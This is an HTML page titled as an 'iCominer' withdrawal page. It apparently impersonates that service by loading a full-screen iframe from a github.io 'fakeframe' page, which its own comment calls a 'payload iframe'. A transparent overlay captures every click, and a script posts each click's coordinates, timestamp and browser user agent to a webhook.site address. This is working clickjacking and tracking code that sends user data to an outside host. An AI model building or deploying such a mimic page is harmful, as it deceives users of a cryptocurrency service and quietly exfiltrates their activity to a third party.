<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Withdraw | iCominer</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      height: 100%;
      overflow: hidden;
    }
    iframe {
      position: absolute;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      border: none;
      z-index: 1;
    }
    .overlay-log {
      position: fixed;
      top: 10px;
      left: 10px;
      z-index: 9999;
      background: rgba(0,0,0,0.6);
      color: #00ffcc;
      font-size: 12px;
      padding: 5px 10px;
      border-radius: 6px;
      font-family: monospace;
    }
    .click-capture {
      position: absolute;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      z-index: 999;
    }
  </style>
</head>
<body>

  <!-- Overlay notice or interaction layer -->
  <div class="overlay-log">iCominer Mimic Mode - Active</div>

  <!-- Transparent full-page click-capture layer -->
  <div class="click-capture" onclick="captureClick(event)"></div>

  <!-- Fully controlled payload iframe -->
  <iframe src="https://awaxrx.github.io/icominer/fakeframe.html" allow="clipboard-write; fullscreen;"></iframe>

  <script>
    function captureClick(e) {
      fetch("https://webhook.site/846de35d-2625-497d-8ab8-414d516ccb49", {
        method: "POST",
        body: JSON.stringify({
          event: "click",
          x: e.clientX,
          y: e.clientY,
          time: new Date().toISOString(),
          ua: navigator.userAgent
        }),
        headers: { "Content-Type": "application/json" }
      });
    }
  </script>
</body>
</html>
